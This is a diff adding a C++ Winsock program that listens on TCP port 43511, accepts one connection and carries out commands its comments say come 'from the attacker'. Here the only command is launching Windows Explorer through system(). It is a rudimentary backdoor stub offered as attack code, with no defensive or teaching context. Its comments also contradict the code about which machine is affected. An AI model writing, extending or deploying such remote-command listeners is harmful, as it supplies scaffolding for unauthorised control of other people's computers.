@@ -1,0 +1,84 @@
+#include <iostream>
+#include <cstring>
+#include <winsock2.h>
+
+#define SERVER_PORT 43511
+
+int main() {
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        std::cerr << "Failed to initialize winsock" << std::endl;
+        return 1;
+    }
+
+    SOCKET sockfd, client_sockfd;
+    struct sockaddr_in server_addr, client_addr;
+    int client_len;
+    char command[256];
+
+    // Create a socket
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd == INVALID_SOCKET) {
+        std::cerr << "Failed to create socket: " << WSAGetLastError() << std::endl;
+        WSACleanup();
+        return 1;
+    }
+
+    // Set server address
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_addr.s_addr = INADDR_ANY;
+    server_addr.sin_port = htons(SERVER_PORT);
+
+    // Bind the socket to the specified address and port
+    if (bind(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
+        std::cerr << "Failed to bind socket: " << WSAGetLastError() << std::endl;
+        closesocket(sockfd);
+        WSACleanup();
+        return 1;
+    }
+
+    // Listen for incoming connections
+    if (listen(sockfd, 1) == SOCKET_ERROR) {
+        std::cerr << "Failed to listen for connections: " << WSAGetLastError() << std::endl;
+        closesocket(sockfd);
+        WSACleanup();
+        return 1;
+    }
+
+    std::cout << "Waiting for incoming connections..." << std::endl;
+
+    // Accept an incoming connection
+    client_len = sizeof(client_addr);
+    client_sockfd = accept(sockfd, (struct sockaddr*)&client_addr, &client_len);
+    if (client_sockfd == INVALID_SOCKET) {
+        std::cerr << "Failed to accept connection: " << WSAGetLastError() << std::endl;
+        closesocket(sockfd);
+        WSACleanup();
+        return 1;
+    }
+
+    std::cout << "Connection accepted. Ready to receive commands." << std::endl;
+
+    // Receive commands from the attacker
+    while (true) {
+        memset(command, 0, sizeof(command));
+        int bytes_received = recv(client_sockfd, command, sizeof(command), 0);
+        if (bytes_received <= 0)
+            break;
+
+        std::cout << "Received command: " << command << std::endl;
+       
+        // Process the command
+        if (strcmp(command, "open_file_explorer") == 0) {
+            // Open the file explorer on the attacker's PC
+            system("start explorer");
+        }
+    }
+
+    // Close the connection
+    closesocket(client_sockfd);
+    closesocket(sockfd);
+    WSACleanup();
+
+    return 0;
+}
